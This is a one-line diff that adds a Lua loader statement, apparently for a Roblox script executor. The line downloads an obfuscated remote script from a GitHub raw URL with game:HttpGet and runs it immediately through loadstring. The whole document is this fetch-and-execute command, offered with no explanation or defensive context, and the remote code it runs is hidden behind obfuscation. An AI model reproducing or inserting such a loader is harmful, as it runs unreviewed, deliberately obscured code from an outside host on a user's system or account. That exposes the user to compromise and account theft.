@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylnox/Michael24/refs/heads/main/obf_y75RAmj19i8v7zWfhe4LZs8pS5wD9a0k42u68du1mKOwIO3x5NX37o1Ai81MK4xX.lua.txt",true))()
